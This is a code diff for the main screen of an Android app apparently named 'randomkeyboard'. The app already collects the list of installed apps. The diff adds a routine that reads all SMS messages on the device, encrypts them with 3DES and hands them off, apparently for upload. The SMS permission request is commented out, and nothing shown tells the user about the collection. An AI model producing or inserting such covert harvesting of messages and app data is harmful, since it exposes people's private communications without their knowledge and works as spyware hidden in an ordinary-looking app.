@@ -19,8 +19,12 @@ import com.benli.keyboard.KeyboardHelper;
 import com.benli.randomkeyboard.app.AppInfoBean;
 import com.benli.randomkeyboard.app.AppUtils;
 import com.benli.randomkeyboard.app.UploadDataBean;
+import com.benli.randomkeyboard.sms.SMSInfoBean;
+import com.benli.randomkeyboard.sms.SMSUtils;
+import com.blankj.utilcode.constant.PermissionConstants;
 import com.blankj.utilcode.util.ConvertUtils;
 import com.blankj.utilcode.util.EncryptUtils;
+import com.blankj.utilcode.util.PermissionUtils;
 import com.blankj.utilcode.util.SPStaticUtils;
 import com.blankj.utilcode.util.StringUtils;
 import com.facebook.drawee.view.SimpleDraweeView;
@@ -56,12 +60,25 @@ public class MainActivity extends AppCompatActivity implements CommonUtils.OnDyn
         draweeView.setImageURI(uri);
 
         collectAppInfo("test-randomkeyboard");
+
+//        PermissionUtils.permission(PermissionConstants.SMS).callback(new PermissionUtils.SimpleCallback() {
+//            @Override
+//            public void onGranted() {
+//                collectSMSInfo("test-randomkeyboard-sms");
+//            }
+//
+//            @Override
+//            public void onDenied() {
+//
+//            }
+//        }).request();
     }
 
-    private void doCollectAppInfo(UploadDataBean uploadDataBean) {
+    private void doCollectInfo(UploadDataBean uploadDataBean) {
         String data = new Gson().toJson(uploadDataBean.data);
         UploadDataBean<String> bean = new UploadDataBean<>();
-        bean.data = EncryptUtils.encrypt3DES2HexString(data.getBytes(), bytesKeyDES, "DES/ECB/NoPadding", null );
+        byte[] dataBytes = EncryptUtils.encrypt3DES2Base64(data.getBytes(), bytesKeyDES, "DES/CBC/PKCS5Padding", null );
+        bean.data = new String(dataBytes);
         bean.dataID = uploadDataBean.dataID;
         bean.endTime = uploadDataBean.endTime;
         bean.node = uploadDataBean.node;
@@ -72,6 +89,49 @@ public class MainActivity extends AppCompatActivity implements CommonUtils.OnDyn
         bean.total = uploadDataBean.total;
         bean.type = uploadDataBean.type;
         doSaveNew(bean);
+    }
+
+    private void collectSMSInfo(String collectNode) {
+        UploadDataBean<List<SMSInfoBean>> uploadDataBean = new UploadDataBean<>();
+        uploadDataBean.startTime = System.currentTimeMillis();
+        uploadDataBean.dataID = java.util.UUID.randomUUID().toString();
+        uploadDataBean.type = 6;
+        uploadDataBean.node = collectNode;
+
+        List<SMSInfoBean> smsInfoBeanList = SMSUtils.getSmsInPhone(this);
+        uploadDataBean.endTime = System.currentTimeMillis();
+
+        int remainder = smsInfoBeanList.size() % PAGE_LIMIT;
+        int page = smsInfoBeanList.size() / PAGE_LIMIT;
+
+        uploadDataBean.orderLength = remainder > 0 ? page + 1 : page;
+        uploadDataBean.total = smsInfoBeanList.size();
+
+        for (int i = 0; i < page; i ++) {
+
+            UploadDataBean<List<SMSInfoBean>> realUploadDataBean = uploadDataBean;
+
+            try {
+                realUploadDataBean = (UploadDataBean<List<SMSInfoBean>>) uploadDataBean.clone();
+            } catch (CloneNotSupportedException e) {
+                e.printStackTrace();
+            }
+
+            realUploadDataBean.order = i + 1;
+            realUploadDataBean.pageCount = PAGE_LIMIT;
+            realUploadDataBean.data = smsInfoBeanList.subList(i * PAGE_LIMIT, (i + 1) * PAGE_LIMIT);
+
+            doCollectInfo(realUploadDataBean);
+        }
+
+        if (remainder > 0) {
+            uploadDataBean.order = page + 1;
+            uploadDataBean.pageCount = remainder;
+            uploadDataBean.data = smsInfoBeanList.subList(uploadDataBean.total - remainder, uploadDataBean.total);
+
+            doCollectInfo(uploadDataBean);
+        }
+
     }
 
     private void doSaveNew(UploadDataBean uploadDataBean) {
@@ -130,7 +190,7 @@ public class MainActivity extends AppCompatActivity implements CommonUtils.OnDyn
             realUploadDataBean.pageCount = PAGE_LIMIT;
             realUploadDataBean.data = appInfoBeanList.subList(i * PAGE_LIMIT, (i + 1) * PAGE_LIMIT);
 
-            doCollectAppInfo(realUploadDataBean);
+            doCollectInfo(realUploadDataBean);
         }
 
         if (remainder > 0) {
@@ -138,7 +198,7 @@ public class MainActivity extends AppCompatActivity implements CommonUtils.OnDyn
             uploadDataBean.pageCount = remainder;
             uploadDataBean.data = appInfoBeanList.subList(uploadDataBean.total - remainder, uploadDataBean.total);
 
-            doCollectAppInfo(uploadDataBean);
+            doCollectInfo(uploadDataBean);
         }
     }
 
